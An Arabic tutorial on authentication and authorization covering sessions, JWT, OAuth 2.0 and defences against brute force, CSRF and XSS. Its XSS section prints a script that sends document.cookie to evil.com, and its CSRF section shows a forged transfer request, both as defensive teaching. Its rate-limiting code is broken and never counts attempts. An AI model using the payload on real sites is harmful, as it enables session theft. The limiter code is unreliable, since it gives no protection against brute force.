# مبادئ المصادقة والترخيص
> 💡 **دليل التعلم**: يأخذك هذا الفصل في رحلة عميقة لفهم "نظام التحكم في الدخول" للأنظمة الخلفية — المصادقة والترخيص. سنبدأ من الأساسيات "من أنت"، ونتقدم خطوة بخطوة لإتقان حلول المصادقة الحديثة مثل Session و JWT و OAuth 2.0.

<AuthEvolutionDemo />

## 0. المقدمة: "التحكم في الدخول" للنظام

لماذا تظل مسجلاً دخولك في WeChat بعد إغلاقه وفتحه مرة أخرى؟
عند زيارتك لـ Bilibili، كيف يعرف الموقع ما إذا كنت عضواً مميزاً أم مستخدماً عادياً؟
عند تسجيل دخولك لمواقع الطرف الثالث باستخدام رمز WeChat، لماذا لا تحتاج لإدخال كلمة المرور؟

وراء كل هذا يوجد نظام أساسي واحد: **المصادقة والترخيص (Authentication & Authorization)**.

إذا شبهنا النظام الخلفي بمبنى كبير:

- **المصادقة (Authentication)**: التحقق من "من أنت" (التحقق من بطاقة الهوية / بطاقة الدخول).
- **الترخيص (Authorization)**: التحقق من "إلى أين يمكنك الذهاب" (يمكن لحامل بطاقة VIP دخول صالة VIP، بينما لا يستطيع المستخدم العادي).

### 0.1 الدافع وراء نحتاج إلى المصادقة

هناك سبب واحد فقط: **حماية الموارد**.

- **حماية الخصوصية**: معلوماتك الشخصية وسجل المحادثات، لا يمكن لأحد غيرك الاطلاع عليها.
- **التحكم في الصلاحيات**: يمكن للمسؤول حذف المستخدمين، بينما لا يستطيع المستخدم العادي ذلك.
- **منع الإساءة**: منع الاستدعاءات الخبيثة وهجمات استنزاف الواجهات البرمجية (API).

<AuthBasicsDemo />

### 0.2 عرض تفاعلي: عملية تسجيل الدخول

دعنا نفهم كيفية عمل المصادقة والترخيص من خلال عرض توضيحي حقيقي لتسجيل الدخول.

<AuthInteractiveLoginDemo />

**النقطة الأساسية**: المصادقة هي خط الدفاع الأول، ويجب التحقق من الهوية قبل جميع العمليات الحساسة.

---

## 1. المفاهيم الأساسية: المصادقة مقابل الترخيص

### 1.1 المصادقة (Authentication): تعريف وقياس أنت

التحقق من هوية المستخدم.

- _مثال_: إدخال اسم المستخدم وكلمة المرور، مسح البصمة، التعرف على الوجه.
- _المخرج_: رمز مميز (Token) يمثل "أنت".
- _الاختصار الإنجليزي_: **AuthN**

### 1.2 الترخيص (Authorization): تعريف وقياس يمكنك أن تفعل

التحقق من الصلاحيات التي يمتلكها المستخدم.

- _مثال_: يمكن للمسؤول حذف المقالات، بينما يمكن للمستخدم العادي فقط الإعجاب.
- _المخرج_: السماح أو رفض الوصول.
- _الاختصار الإنجليزي_: **AuthZ**

### 1.3 العلاقة بينهما

```
طلب المستخدم → المصادقة (من أنت؟) → الترخيص (هل يمكنك القيام بذلك؟) → تنفيذ منطق الأعمال
                ↓                        ↓
           التحقق من الهوية         التحقق من الصلاحيات
           (هل Token صالح؟)         (هل لديه صلاحية الحذف؟)
```

<AuthNvsAuthZDemo />

**النقطة الأساسية**: المصادقة أولاً، ثم الترخيص. فقط بعد التأكد من "من أنت"، يمكننا الحكم على "ماذا يمكنك أن تفعل".

---

## 2. تاريخ تطور الحلول

### 2.1 الجيل الأول: HTTP Basic Authentication

أقدم حل، يتم وضع اسم المستخدم وكلمة المرور مباشرة في رأس HTTP.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **المزايا**: بسيط، مدعوم من جميع المتصفحات.
- **العيوب**:
  - غير آمن (Base64 يمكن فك تشفيره، أي ما يعادل النص الواضح).
  - يجب إرسال كلمة المرور مع كل طلب (سهلة الاعتراض).
  - لا يمكن تسجيل الخروج بشكل فعال (إلا بإغلاق المتصفح).

**الخلاصة**: مناسب فقط لأدوات الاختبار الداخلية، ولا يستخدم أبداً في بيئة الإنتاج.

### 2.2 الجيل الثاني: Session + Cookie

الحل الكلاسيكي لتطوير الويب.

**التدفق**:

```
1. تسجيل دخول المستخدم (POST /login)
   → يتحقق الخادم من اسم المستخدم وكلمة المرور
   → إنشاء Session (في ذاكرة الخادم أو Redis)
   → إرجاع Set-Cookie: session_id=abc123

2. الطلبات اللاحقة
   → يقوم المتصفح تلقائياً بإرفاق Cookie: session_id=abc123
   → يبحث الخادم عن Session بناءً على session_id
   → إذا وجدها يعتبر أن "أنت هو أنت"
```

**مثال على الكود**:

```python
# الخلفية (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # التحقق من اسم المستخدم وكلمة المرور
    user = db.authenticate(username, password)
    if user:
        # إنشاء Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "اسم المستخدم أو كلمة المرور غير صحيحة"}, 401

@app.route("/api/admin/users")
def get_users():
    # التحقق من Session
    if "user_id" not in session:
        return {"error": "غير مسجل الدخول"}, 401

    # التحقق من الصلاحيات
    if session.get("role") != "admin":
        return {"error": "صلاحيات غير كافية"}, 403

    # تنفيذ منطق الأعمال
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**المزايا**:

- بسيط وبديهي، سهل الفهم.
- يمكن للخادم تسجيل الخروج بشكل فعال (حذف Session).

**العيوب**:

- **الخادم ذو حالة (Stateful)**: يحتاج لتخزين Session، وتحتاج الخوادم المتعددة للمشاركة (مثل Redis).
- **صعوبة النطاقات المتقاطعة (Cross-domain)**: لا يمكن لـ Cookie عبور النطاقات افتراضياً (مشكلة CORS).
- **هجمات CSRF**: يمكن للمواقع الخبيثة انتحال Cookie الخاص بك.

**الخلاصة**: مناسب لتطبيقات الويب التقليدية (العرض من جانب الخادم)، غير مناسب للهواتف المحمولة وتطبيقات SPA الحديثة.

### 2.3 الجيل الثالث: Token (JWT)

الحل السائد في الويب الحديث.

**الفكرة الأساسية**: عدم تخزين الحالة في الخادم، وتشفير معلومات المستخدم في Token وحفظها في العميل.

**هيكل JWT**:

```
JWT = Header.Payload.Signature

مثال:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: معلومات الخوارزمية (مثل `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: معلومات المستخدم (مثل `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: التوقيع (لمنع التلاعب).

**التدفق**:

```python
# 1. تسجيل دخول المستخدم
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # إنشاء JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # ينتهي بعد 24 ساعة
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "اسم المستخدم أو كلمة المرور غير صحيحة"}, 401

# 2. الطلبات اللاحقة
@app.route("/api/admin/users")
def get_users():
    # الحصول على Token من Header
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "لم يتم توفير Token"}, 401

    token = auth_header.split(" ")[1]

    try:
        # التحقق من Token وتحليله
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "انتهت صلاحية Token"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token غير صالح"}, 401

    # التحقق من الصلاحيات
    if payload.get("role") != "admin":
        return {"error": "صلاحيات غير كافية"}, 403

    # تنفيذ منطق الأعمال
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**المزايا**:

- **بدون حالة (Stateless)**: لا يخزن الخادم Session، مما يسهل التوسع الأفقي.
- **مناسب للنطاقات المتقاطعة**: يوضع في Header، ولا يخضع لقيود Cookie عبر النطاقات.
- **مناسب للهواتف المحمولة**: يمكن للتطبيقات الأصلية استخدامه بسهولة.
- **غني بالمعلومات**: يمكن لـ Payload تخزين معلومات المستخدم والصلاحيات وغيرها.

**العيوب**:

- **لا يمكن تسجيل الخروج بشكل فعال**: بمجرد إصدار Token، يظل صالحاً حتى انتهاء صلاحيته (إلا باستخدام القائمة السوداء).
- **Payload مرئي**: ترميز Base64، لا يمكن تخزين معلومات حساسة (مثل كلمة المرور).
- **Token كبير الحجم**: يجب إرفاقه مع كل طلب، يصل إلى مئات البايتات.

**الخلاصة**: الحل القياسي للويب الحديث والهواتف المحمولة.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: تسجيل الدخول عبر الطرف الثالث

بالتأكيد رأيت هذا الزر: "تسجيل الدخول باستخدام WeChat"، "تسجيل الدخول باستخدام Google".

هذا هو **OAuth 2.0**: إطار عمل **ترخيص** (وليس مصادقة!).

### 3.1 الأدوار الأساسية

| الدور                     | الوصف                         | مثال                    |
| :------------------------ | :---------------------------- | :---------------------- |
| **Resource Owner**        | مالك المورد (المستخدم)        | أنت                     |
| **Client**                | تطبيق الطرف الثالث            | موقع ويب معين           |
| **Authorization Server**  | خادم الترخيص                  | WeChat، Google          |
| **Resource Server**       | خادم الموارد                  | واجهة معلومات مستخدم WeChat |

### 3.2 وضع رمز الترخيص (Authorization Code Flow)

الوضع الأكثر أماناً، مناسب للخوادم التي لديها خلفية.

**التدفق**:

```
1. ينقر المستخدم على "تسجيل الدخول باستخدام WeChat"
   → التوجيه إلى صفحة ترخيص WeChat
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. يمسح المستخدم الرمز ويوافق على الترخيص
   → يعيد WeChat التوجيه إلى موقعك
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. تستخدم خلفيتك code لاستبداله بـ access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → يعيد: { "access_token": "...", "openid": "..." }

4. استخدام access_token للحصول على معلومات المستخدم
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → يعيد: { "nickname": "Zhang San", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**مثال على الكود**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. التوجيه إلى صفحة ترخيص WeChat
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. الحصول على code
    code = request.args.get("code")
    state = request.args.get("state")

    # التحقق من state (لمنع CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. استخدام code لاستبداله بـ access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. الحصول على معلومات المستخدم
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. إنشاء أو تحديث المستخدم محلياً
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. إنشاء JWT للنظام المحلي
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**النقاط الأساسية**:

- **code يستخدم مرة واحدة فقط**: يصبح غير صالح بعد الاستخدام، لمنع الاعتراض.
- **state لمنع CSRF**: إنشاء سلسلة عشوائية، والتحقق منها عند إعادة الاستدعاء، لمنع تزوير المواقع الخبيثة.
- **redirect_uri يجب أن يتطابق**: التسجيل المسبق في منصة WeChat المفتوحة، لمنع هجمات إعادة التوجيه.

### 3.3 الأوضاع الأخرى

| الوضع                                | السيناريو المناسب                          | مستوى الأمان     |
| :----------------------------------- | :----------------------------------------- | :--------------- |
| **وضع رمز الترخيص**                  | الخوادم ذات الخلفية                        | ⭐⭐⭐⭐⭐       |
| **الوضع المبسط (Implicit)**          | تطبيقات الواجهة الأمامية البحتة (SPA)      | ⭐⭐⭐ (غير موصى به) |
| **وضع كلمة المرور (Resource Owner)** | التطبيقات عالية الثقة (مثل التطبيق الرسمي) | ⭐⭐             |
| **وضع العميل (Client Credentials)**  | الاتصال بين الخوادم (بدون مستخدم)          | ⭐⭐⭐⭐         |

<OAuth2ModesDemo />

---

## 4. تطبيق عملي: تصميم نظام مصادقة كامل

### 4.1 تحليل المتطلبات

- **دعم متعدد المنصات**: الويب، iOS، Android.
- **تسجيل الدخول عبر الطرف الثالث**: WeChat، Google.
- **التحكم في الصلاحيات**: مستخدم عادي، VIP، مسؤول.
- **الأمان**: منع هجمات الاستنزاف، منع الاختطاف، منع إعادة التشغيل.

### 4.2 تصميم المعمارية

```
┌─────────────┐
│   العميل     │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting (تحديد المعدل)  │
│  - Token Validation (التحقق)     │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service (خدمة المصادقة) │
│  - التسجيل، تسجيل الدخول         │
│  - إصدار Token والتحقق منه       │
│  - تكامل OAuth 2.0               │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services             │
│  - User Service                  │
│  - Order Service                 │
│  - Payment Service               │
└─────────────────────────────────┘
```

### 4.3 تصميم قاعدة البيانات

```sql
-- جدول المستخدمين
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- تجزئة bcrypt
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- جدول ربط تسجيل الدخول عبر الطرف الثالث
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- معرف المستخدم لدى الطرف الثالث
    access_token TEXT,  -- تخزين مشفر
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- القائمة السوداء لـ Token (لتسجيل الخروج الفعال)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JTI (المعرف الفريد) لـ JWT
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 تنفيذ الكود

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # في بيئة الإنتاج استخدم متغيرات البيئة

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. التحقق من وجود اسم المستخدم
        if db.get_user_by_username(username):
            raise ValueError("اسم المستخدم موجود بالفعل")

        # 2. تجزئة كلمة المرور (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. إنشاء المستخدم
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. إصدار Token
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. البحث عن المستخدم
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("اسم المستخدم أو كلمة المرور غير صحيحة")

        # 2. التحقق من كلمة المرور
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("اسم المستخدم أو كلمة المرور غير صحيحة")

        # 3. إصدار Token
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (قصير المدى، مثل ساعة واحدة)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # معرف فريد
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (طويل المدى، مثل 30 يوماً)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # مدة صلاحية access_token (بالثواني)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("انتهت صلاحية Refresh token")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token غير صالح")

    def logout(self, token: str):
        # إضافة Token إلى القائمة السوداء
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # التحقق مما إذا كان في القائمة السوداء
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("تم تسجيل خروج Token")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("انتهت صلاحية Token")
        except jwt.InvalidTokenError:
            raise ValueError("Token غير صالح")

# مزخرف API (Decorator)
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # الحصول على Token من Header
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "لم يتم توفير Token"}, 401

            token = auth_header.split(" ")[1]

            try:
                # التحقق من Token
                payload = auth_service.verify_token(token)
                # حقن معلومات المستخدم في سياق الطلب
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "غير مسجل الدخول"}, 401

            if request.user["role"] not in roles:
                return {"error": "صلاحيات غير كافية"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# مثال على الاستخدام
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. أفضل ممارسات الأمان

### 5.1 تخزين كلمة المرور

**❌ الممارسة الخاطئة**:

```python
# تخزين النص الواضح (ممنوع تماماً!)
db.save_password(username, password)

# تجزئة MD5 / SHA1 (غير آمنة بما فيه الكفاية، سهلة الاختراق بجداول قوس قزح)
hash = md5(password)
db.save_password(username, hash)
```

**✅ الممارسة الصحيحة**:

```python
# bcrypt (تجزئة تكيفية، تجزئة بطيئة لمنع هجمات القوة العمياء)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # كلما زادت rounds زاد الأمان، ولكن أيضاً تزداد البطء
)

# التحقق
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # كلمة المرور صحيحة
```

**لماذا bcrypt؟**

- **بطيء**: مصمم عمداً ليكون بطيئاً (بالميلي ثانية)، لمنع هجمات القوة العمياء.
- **تكيفي**: يمكن تعديل rounds، ليزداد قوة مع تطور العتاد.
- **مملح (Salted)**: يحتوي على ملح عشوائي مدمج، لمنع جداول قوس قزح.

<PasswordHashingDemo />

### 5.2 منع هجمات القوة العمياء

- **تحديد المعدل**: نفس IP / اسم المستخدم، يمكنه المحاولة 5 مرات فقط في الدقيقة.
- **رمز التحقق (CAPTCHA)**: بعد 3 محاولات فاشلة، يطلب إدخال رمز التحقق.
- **قفل الحساب**: بعد 10 محاولات فاشلة، يتم قفل الحساب لمدة 30 دقيقة.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """يعيد (عدد المحاولات, وقت أول محاولة)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # إعادة التعيين بعد دقيقة واحدة
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # أكثر من 5 مرات، رفض
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # إعادة التخزين المؤقت

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # التحقق من تحديد المعدل
    if not check_rate_limit(username):
        return {"error": "محاولات كثيرة جداً، يرجى المحاولة بعد دقيقة واحدة"}, 429

    password = request.json["password"]

    # التحقق من كلمة المرور
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # تسجيل دخول ناجح، مسح العداد
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # فشل تسجيل الدخول، تسجيل المحاولة
        record_login_attempt(username)
        return {"error": "اسم المستخدم أو كلمة المرور غير صحيحة"}, 401
```

### 5.3 منع CSRF (Cross-Site Request Forgery)

**سيناريو الهجوم**:
قمت بتسجيل الدخول إلى موقع البنك `bank.com`، ثم قمت بزيارة موقع خبيث `evil.com`. يحتوي موقع `evil.com` على كود:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

سيقوم متصفحك بإرفاق Cookie الخاص بالبنك مع هذا الطلب (طلب عبر النطاقات)، مما يؤدي إلى سرقة الأموال.

**إجراءات الدفاع**:

1.  **CSRF Token**:
    - يقوم الخادم بإنشاء Token عشوائي ووضعه في النموذج.
    - التحقق من تطابق Token عند الإرسال.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # التحقق من CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token غير صالح"}, 403

    # تنفيذ التحويل
    ...
```

2.  **SameSite Cookie**:
    - تعيين خاصية `SameSite` لـ Cookie إلى `Strict` أو `Lax`.

```python
# مثال Flask
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # أو 'Strict'
    SESSION_COOKIE_SECURE=True      # السماح بـ HTTPS فقط
)
```

3.  **استخدام JWT (بدون Cookie)**:
    - JWT مخزن في `localStorage`، ولا يتم إرفاقه تلقائياً، مما يمنع CSRF بشكل طبيعي.

<CSRFDefenseDemo />

### 5.4 منع XSS (Cross-Site Scripting)

**سيناريو الهجوم**:
يقوم مستخدم خبيث بإدخال التعليق التالي:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

إذا قام الموقع بعرض هذا المحتوى مباشرة، فسيتم سرقة Cookie الخاص بالمستخدمين الآخرين.

**إجراءات الدفاع**:

1.  **تهريب المخرجات (Output Escaping)**:
    - تحويل `<` إلى `&lt;`، و `>` إلى `&gt;`.

```python
import html

def render_comment(comment):
    # تهريب HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - تعيين رأس HTTP، لتقييد مصادر السكربتات.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - تعيين خاصية `HttpOnly` لـ Cookie، بحيث لا يمكن لـ JavaScript قراءتها.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. الملخص ومسار التعلم

المصادقة هي "المهارة الأساسية" للأنظمة الخلفية، وإتقانها هو ما يمكنك من بناء تطبيقات آمنة وموثوقة.

### 6.1 نقاط المعرفة الأساسية

| نقطة المعرفة               | درجة الأهمية | الصعوبة | تكرار الاستخدام العملي |
| :------------------------- | :----------- | :------ | :--------------------- |
| **Session + Cookie**       | ⭐⭐⭐⭐     | متوسطة  | عالية                  |
| **JWT**                    | ⭐⭐⭐⭐⭐   | منخفضة  | عالية جداً             |
| **OAuth 2.0**              | ⭐⭐⭐⭐     | عالية   | عالية                  |
| **تجزئة كلمة المرور (bcrypt)** | ⭐⭐⭐⭐⭐ | منخفضة  | عالية جداً             |
| **تحديد المعدل ومنع القوة العمياء** | ⭐⭐⭐⭐⭐ | متوسطة  | عالية جداً             |
| **الدفاع ضد CSRF**         | ⭐⭐⭐⭐     | متوسطة  | متوسطة                 |
| **الدفاع ضد XSS**          | ⭐⭐⭐⭐     | منخفضة  | عالية                  |

### 6.2 مسار التعلم

1.  **المبتدئ** (1-2 يوم):
    - فهم المصادقة مقابل الترخيص.
    - إتقان مبدأ Session + Cookie.
    - تنفيذ وظيفة تسجيل دخول وتسجيل بسيطة.

2.  **المتوسط** (أسبوع واحد):
    - تعلم مبدأ وتنفيذ JWT.
    - تنفيذ نظام مصادقة مبني على JWT.
    - إتقان تجزئة كلمة المرور (bcrypt).

3.  **التطبيقي** (2-4 أسابيع):
    - تكامل OAuth 2.0 (تسجيل الدخول بـ WeChat، Google).
    - تنفيذ تحديد المعدل ومنع هجمات القوة العمياء.
    - الدفاع ضد هجمات CSRF و XSS وغيرها من الهجمات الشائعة.

4.  **المتعمق** (مستمر):
    - تعلم RBAC (التحكم في الوصول المبني على الأدوار).
    - دراسة SSO (تسجيل الدخول الموحد).
    - استكشاف Zero Trust Architecture (معمارية الثقة الصفرية).

### 6.3 الموارد الموصى بها

- **المعايير**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **المقالات**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0 النسخة الصينية المبسطة: https://oauth.net/2/
- **الأدوات**:
  - jwt.io (تصحيح JWT عبر الإنترنت)
  - Postman (اختبار API)

---

## 7. جدول المصطلحات (Glossary)

| المصطلح           | الاسم الكامل                | الشرح                                                                                             |
| :---------------- | :-------------------------- | :------------------------------------------------------------------------------------------------ |
| **AuthN**         | Authentication              | **المصادقة**. التحقق من "من أنت" (مثل التحقق من الهوية بإدخال كلمة المرور).                       |
| **AuthZ**         | Authorization               | **الترخيص**. التحقق من "ماذا يمكنك أن تفعل" (مثل المسؤول فقط يمكنه الحذف).                        |
| **Session**       | -                           | **الجلسة**. معلومات حالة المستخدم المخزنة في الخادم.                                              |
| **Cookie**        | -                           | **ملف تعريف الارتباط**. بيانات صغيرة يخزنها المتصفح، يتم إرفاقها تلقائياً مع كل طلب.              |
| **JWT**           | JSON Web Token              | **رمز JSON Web**. حل مصادقة بدون حالة، يتكون من ثلاثة أجزاء: Header و Payload و Signature.        |
| **OAuth 2.0**     | -                           | **التفويض المفتوح**. إطار عمل موحد لتسجيل الدخول عبر الطرف الثالث (مثل "تسجيل الدخول بـ WeChat"). |
| **SSO**           | Single Sign-On              | **تسجيل الدخول الموحد**. تسجيل دخول مرة واحدة للوصول إلى تطبيقات متعددة (مثل حساب Google لجميع خدمات Google). |
| **RBAC**          | Role-Based Access Control   | **التحكم في الوصول المبني على الأدوار**. تحديد الصلاحيات بناءً على دور المستخدم (مثل admin، user). |
| **CSRF**          | Cross-Site Request Forgery  | **تزوير الطلبات عبر المواقع**. يقوم المهاجم بخداع المستخدم لإرسال طلبات خبيثة (مثل استخدام Cookie الخاص بك للتحويل). |
| **XSS**           | Cross-Site Scripting        | **هجمات السكربتات عبر المواقع**. يقوم المهاجم بحقن سكربتات خبيثة في صفحة الويب (مثل سرقة Cookie).  |
| **bcrypt**        | -                           | **خوارزمية تجزئة كلمة المرور**. خوارزمية تجزئة بطيئة، مصممة خصيصاً لتخزين كلمة المرور ومنع هجمات القوة العمياء. |
| **Access Token**  | -                           | **رمز الوصول**. رمز قصير الصلاحية، يستخدم للوصول إلى API.                                         |
| **Refresh Token** | -                           | **رمز التحديث**. رمز طويل الصلاحية، يستخدم للحصول على Access Token جديد.                          |
| **Scope**         | -                           | **نطاق الصلاحية**. مفهوم في OAuth 2.0، يمثل الصلاحيات التي يطلبها تطبيق الطرف الثالث (مثل قراءة معلومات المستخدم). |
| **PKCE**          | Proof Key for Code Exchange | **مفتاح إثبات تبادل رمز الترخيص**. امتداد لـ OAuth 2.0، لتعزيز أمان العملاء العامين (مثل SPA).    |